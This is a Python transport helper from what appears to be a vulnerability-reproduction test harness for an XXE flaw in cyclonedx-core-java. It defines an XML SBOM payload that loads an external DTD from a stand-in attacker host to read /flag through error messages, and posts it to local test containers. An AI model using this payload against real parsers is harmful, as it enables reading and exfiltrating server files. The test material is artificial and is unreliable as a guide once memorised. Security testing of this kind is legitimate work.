#!/usr/bin/env python3
"""Shared transport for cyclonedx-cve-2025-64518 (XXE read-exfil canary).

One helper posts an attacker-supplied XML SBOM to a version's REAL cyclonedx-core-java sink and returns
the raw HTTP response text (which includes the library's own error/exception text -> where an error-based
XXE surfaces the /flag content). The endpoint selects the code path:
    /parse    -> XmlParser.parse    (CVE-2024-38374 parser path)
    /validate -> XmlParser.validate (CVE-2025-64518 validator path)
"""
import urllib.request

# Host-published app ports per version (see docker-compose.yml).
HOST_APP = {
    "v0": "http://127.0.0.1:34840",
    "v1": "http://127.0.0.1:34841",
    "v2": "http://127.0.0.1:34842",
}

# Malicious SBOM: an external parameter-entity DTD (attacker-hosted) drives an error-based local file
# read of file:///flag. Identical XML for both paths; only the ENDPOINT (parse vs validate) differs,
# which is exactly the point -- the incomplete fix is a sibling code path, not a payload difference.
XXE_SBOM = (
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<!DOCTYPE bom [\n"
    "  <!ENTITY % dtd SYSTEM \"http://attacker/evil.dtd\">\n"
    "  %dtd;\n"
    "]>\n"
    "<bom xmlns=\"http://cyclonedx.org/schema/bom/1.6\"/>\n"
)


def post(payload: str, version: str, endpoint: str, timeout: int = 30) -> str:
    """POST the XML `payload` to <version>/<endpoint>; return the response body text (or error text)."""
    url = HOST_APP[version] + endpoint
    req = urllib.request.Request(url, data=payload.encode("utf-8"),
                                 headers={"Content-Type": "application/xml"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return f"__transport_error__: {e!r}"


# 平台动态端口覆盖（compose 已转 PORT_ 动态端口）
import os as _pcb_os
_pt = _pcb_os.environ.get("PCB_TARGET_PORT")
if _pt:
    for _d in ("HOST_APP", "PORTS", "HOSTPORT"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _val = globals()[_d][_v]
                if isinstance(_val, (tuple, list)):
                    globals()[_d][_v] = (str(_val[0]), int(_pt))
                elif str(_val).startswith("http"):
                    globals()[_d][_v] = f"http://127.0.0.1:{int(_pt)}"
                else:
                    globals()[_d][_v] = int(_pt)
